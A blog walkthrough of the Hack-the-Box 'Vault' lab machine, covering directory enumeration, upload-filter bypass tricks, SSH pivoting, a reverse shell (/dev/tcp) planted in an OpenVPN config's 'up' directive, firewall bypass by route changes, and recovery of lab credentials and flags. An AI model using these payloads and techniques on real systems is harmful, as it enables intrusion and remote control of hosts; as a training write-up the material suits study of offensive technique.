@@ -1,0 +1,187 @@
+---
+title: "Hack-the-box Vault"
+layout: post
+date: 2018-11-25
+tag:
+- hack-the-box
+- pivoting
+- walktrhough
+category: blog
+author: Srbx7
+description: Hack-the-box Vault walktrhough
+---
+
+<img src="/assets/images/vault.png" >
+
+Vault: 10.10.10.109
+===================
+
+Recon:
+======
+
+```
+python3 dirsearch.py -u 10.10.10.109 -e *
+
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
+
+Extensions: nmap | Threads: 10 | Wordlist size: 6040
+
+Error Log: /home/srbz/git/tools/_web/dirsearch/logs/errors-18-11-13_02-07-01.log
+
+Target: 10.10.10.109
+
+[02:07:01] Starting: 
+[02:07:04] 403 -  298B  - /.ht_wsr.txt
+(...)
+[02:07:50] 200 -  299B  - /index.php[02:07:50] 
+[02:08:10] 200 -  299B  - /index.php/login/
+(...)
+Task Completed
+
+```
+
+<img src="/assets/images/index_vault.png" style="width: 70%">
+
+After a few enumerations, you should have quickly reached this login page. If you didn't, you should consider enumerating recursevily directories.
+
+<img src="/assets/images/login_vault.png" style="width: 35%">
+
+> Trying to pass this login page was not the solution. After a while I told my self, what if the index page is saying right. So kept enumerating and found new files.
+
+```
+python3 dirsearch.py -u http://10.10.10.109/sparklays/design -w common.txt -e html,php,txt -f
+
+(...)
+[20:18:43] 200 -   72B  - /sparklays/design/design.html
+(...)
+```
+
+This page gave access to a file upload module with restrictions. Hence, impossible to tell the server to execute commands through a script directly. I remembered few [technics](https://www.owasp.org/index.php/Unrestricted_File_Upload) for bypassing this type of server side control:
+
++ Adding a double extension: `myFile.jpg.php`
++ Changing letters to their capital forms: `myFile.PhP`
++ Using short name (for Windows servers)
++ Dropping the string after the first extension by using the `NULL` character `0x00`: `myFile.jpg0x00.php`
++ Finding missed extension (e.g. `.php5`, `.pht`, `.phtml`, `.shtml`, `.asa`, `.cer`, `.asax`, `.swf`, or `.xap`)
+
+> Replacing the reverse shell extension for the missed extension `.php5` gave access to the ubuntu host as `www-data`.
+
+PrivEsc
+=======
+
+My first reflex was to check what services were reachable from the internal. 
+
+```
+$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:5902          0.0.0.0:*               LISTEN      -               
+tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
+udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -               
+udp        0      0 192.168.122.1:53        0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:67              0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:631             0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:58192           0.0.0.0:*                           -               
+udp6       0      0 :::5353                 :::*                                -               
+udp6       0      0 :::48208                :::*                                -   
+```
+
+Note that local IP adress `192.168.122.1:53` is on another network. 
+
+Since nmap was disabled for the `www-data` user, I try to run `socat` and `ncat` in order to be able to do port forwarding, but they wasn't installed. Then it took a second to find the files left on the desktop, which allowed me to rotate through ssh!
+
+```bash
+cat key
+itscominghome
+
+cat /home/dave/Desktop/ssh
+dave
+Dav3therav3123
+
+cat Servers 
+DNS + Configurator - 192.168.122.4
+Firewall - 192.168.122.5
+The Vault - x
+```
+
+```
+ssh -fNtD 9050 dave@10.10.10.109 [-L 127.0.0.1:8888:192.168.122.4:80]
+proxychains firefox 192.168.122.4
+```
+
+<img src="/assets/images/vault_vpn.jpg" style="width:30%">
+
+This [medium article](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da) defines well what it is and how it's possible to pop a shell out of an OpenVPN config file, so I wont go in details.
+
+```
+remote 192.168.122.1
+dev tun
+nobind
+script-security 2
+up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/2323 0>&1'"
+```
+
+```
+cat ssh
+dave
+dav3gerous567
+
+
+cat user*
+a4***************************3
+```
+
+> At this point you could have change the root password and connect with ssh using these credentials and found alex's `.bash_history` where you would have seen that he was pinging the `192.168.5.2` IP adress. But no chance, this adress was no longuer reachable. 
+
+All the traffic to the Vault was passing trough the  `192.168.122.5` firewall. 
+
+Bypassing firewall was easy. All I had to do was adding another IP adress to the same interface and remove that routing. Then, running a basic scan on this target to unveil the `987/tcp` port wich was exposing a ssh service that was using the same credential then the DNS box.
+
+```
+root@DNS:# route
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun0
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun1
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun2
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun3
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun4
+10.200.0.1      *               255.255.255.255 UH    0      0        0 tun5
+192.168.5.0     192.168.122.5   255.255.255.0   UG    0      0        0 ens3
+192.168.122.0   *               255.255.255.0   U     0      0        0 ens3
+
+root@DNS:# ip address add 192.168.5.137/24 dev ens3
+root@DNS:# route del -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
+root@DNS:# ping 192.168.5.2
+PING 192.168.5.2 (192.168.5.2) 56(84) bytes of data.
+64 bytes from 192.168.5.2: icmp_seq=1 ttl=64 time=1.56 ms
+```
+
+Welcome to the Vault!
+=====================
+
+To complete the box, you had to `scp` the `root.txt.gpg` back to the ubuntu box and pass the key `itscominghome`. ;)
+
+```
+You need a passphrase to unlock the secret key for
+user: "david <dave@david.com>"
+4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)
+
+gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
+      "david <dave@david.com>"
+      gpg: .srb: unknown suffix
+      Enter new filename [root.txt]: root.txt
+
+cat root.txt 
+ca4********************819
+```
